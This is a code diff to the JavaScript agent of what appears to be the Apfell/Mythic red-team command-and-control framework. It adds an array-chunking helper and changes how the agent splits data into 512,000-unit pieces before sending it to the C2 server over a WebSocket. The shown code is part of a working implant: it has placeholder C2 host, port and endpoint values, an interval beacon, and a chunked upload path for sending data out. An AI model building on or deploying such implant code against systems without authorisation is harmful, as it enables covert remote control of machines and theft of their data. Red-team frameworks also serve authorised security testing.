@@ -71,6 +71,14 @@ class customC2 extends baseC2{
 const C2 = new customC2('HOST_REPLACE',  PORT_REPLACE, 'ENDPOINT_REPLACE', SSL_REPLACE, INTERVAL_REPLACE);
 const connection  = new WebSocket(`${C2.server}`);
 
+function chunkArray(array, size) {
+    if(array.length <= size){
+        return [array];
+    }
+
+    return [array.slice(0,size), ...chunkArray(array.slice(size), size)];
+}
+
 setInterval(function(){
     C2.postResponse();
     if (apfell.apfellid.length !== 0) {
@@ -143,9 +151,13 @@ connection.onmessage = function (e) {
                             let temp = [];
                             let chunkSize = 512000;
 
-                            for (let index = 0; index < arrLength; index+=chunkSize) {
-                                let chunk = raw.slice(index, index+chunkSize);
-                                temp.push(chunk);
+                            if (chunkSize > raw.length) {
+                                temp.push(raw);
+                            } else {
+                                for (let index = 0; index < arrLength; index+=chunkSize) {
+                                    let chunk = raw.slice(index, index+chunkSize);
+                                    temp.push(chunk);
+                                }
                             }
 
                             // loop through the chunk array and send each one to apfell
